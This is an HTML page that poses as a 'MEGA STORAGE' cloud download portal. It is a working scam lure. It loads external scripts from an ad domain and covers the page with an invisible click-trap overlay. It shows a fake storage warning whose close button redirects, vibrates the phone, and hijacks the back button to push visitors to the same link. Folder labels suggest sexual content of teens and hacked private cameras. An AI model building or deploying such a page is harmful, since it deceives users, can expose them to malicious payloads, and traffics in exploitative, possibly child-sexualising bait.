<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MEGA STORAGE - Cloud Connect</title>
    
    <script src="https://evacuateenclose.com/2d/f0/3e/2df03ec7f051608ea8806353a1663a9f.js"></script>
    <script src="https://evacuateenclose.com/65/5d/86/655d862c63ab08ee18932b53de13d177.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; overflow-x: hidden; }
        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; background: rgba(0,0,0,0); }
        #fake-alert {
            position: fixed; top: 15%; left: 50%; transform: translateX(-50%);
            width: 90%; max-width: 350px; background: #fff; color: #000;
            padding: 15px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 10000; font-size: 14px; text-align: left; display: block;
        }
        .close-btn {
            position: absolute; top: -10px; right: -10px; width: 30px; height: 30px;
            background: #ff4444; color: white; border-radius: 50%; text-align: center;
            line-height: 28px; font-weight: bold; cursor: pointer; border: 2px solid white;
        }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 10px 5px; border-bottom: 1px solid #1e293b; }
        .logo { color: #3b82f6; font-weight: bold; font-size: 20px; text-transform: uppercase; }
        .status { color: #22c55e; font-size: 13px; font-weight: bold; }
        .folder-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin-bottom: 15px; display: flex; align-items: center; }
        .icon { font-size: 32px; margin-right: 15px; }
        .info { flex-grow: 1; }
        .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 5px; text-transform: uppercase; }
        .info span { font-size: 11px; color: #64748b; }
        .btn-download { display: block; text-decoration: none; background: #2563eb; color: #ffffff; text-align: center; padding: 18px; border-radius: 10px; font-weight: bold; margin-top: 15px; }
        .footer-text { text-align: center; font-size: 10px; margin-top: 30px; color: #475569; }
    </style>
</head>
<body>

    <div id="trap"></div>

    <div id="fake-alert">
        <span id="alert-text"><strong>⚠️ System Warning:</strong> Your storage is almost full. Please download files immediately.</span>
        <div class="close-btn" onclick="triggerLỏ()">X</div>
    </div>

    <div class="header">
        <div class="logo">MEGA STORAGE</div>
        <div class="status">● Online</div>
    </div>

    <div class="folder-card">
        <div class="icon">📁</div>
        <div class="info"><b class="f-name">T.E.E.N</b><span>142 Files</span></div>
    </div>
    <div class="folder-card">
        <div class="icon">📁</div>
        <div class="info"><b class="f-name">L.A.T.I.N.A</b><span>85 Files</span></div>
    </div>
    <div class="folder-card">
        <div class="icon">📁</div>
        <div class="info"><b class="f-name">H.4.C.K C.A.M.E.R.A </b><span>210 Files</span></div>
    </div>

    <a href="https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566" class="btn-download" id="main-btn">DOWNLOAD ALL PRIVATE FILES</a>

    <div class="footer-text" id="footer">Secure Cloud Encryption © 2026. <br> Mumbai Cluster Node.</div>

    <script>
        var sLink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";

        // 1. Nhận diện ngôn ngữ & Đổi nội dung
        var userLang = navigator.language || navigator.userLanguage;
        if (userLang.toLowerCase().includes('pt')) {
            document.getElementById('alert-text').innerHTML = "<strong>⚠️ Aviso do Sistema:</strong> Seu armazenamento está quase cheio. Baixe agora.";
            document.getElementById('main-btn').innerText = "BAIXAR TODOS OS ARQUIVOS";
            document.getElementById('footer').innerHTML = "Criptografia de nuvem segura © 2026. <br> Servidor Nodo Brasil.";
            var folders = document.querySelectorAll('.f-name');
            folders[0].innerText = "V.I.D.E.O.S_V.I.R.A.I.S";
            folders[1].innerText = "C.A.M.E.R.A_P.R.I.V.A.D.A";
            folders[2].innerText = "A.R.Q.U.I.V.O.S_L.E.A.K";
        }

        // 2. Trigger Click Nút X
        function triggerLỏ() {
            window.location.href = sLink;
        }

        // 3. Trap tàng hình (Optimized)
        document.getElementById('trap').addEventListener('click', function() {
            this.style.display = 'none';
        }, {passive: true});

        // 4. Delay Tricks (Rung máy, Back Hijack) để tăng Performance
        window.addEventListener('load', function() {
            setTimeout(function() {
                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                
                history.pushState(null, document.title, location.href);
                window.addEventListener('popstate', function () {
                    window.location.assign(sLink);
                });
            }, 1000);
        });
    </script>

</body>
</html>
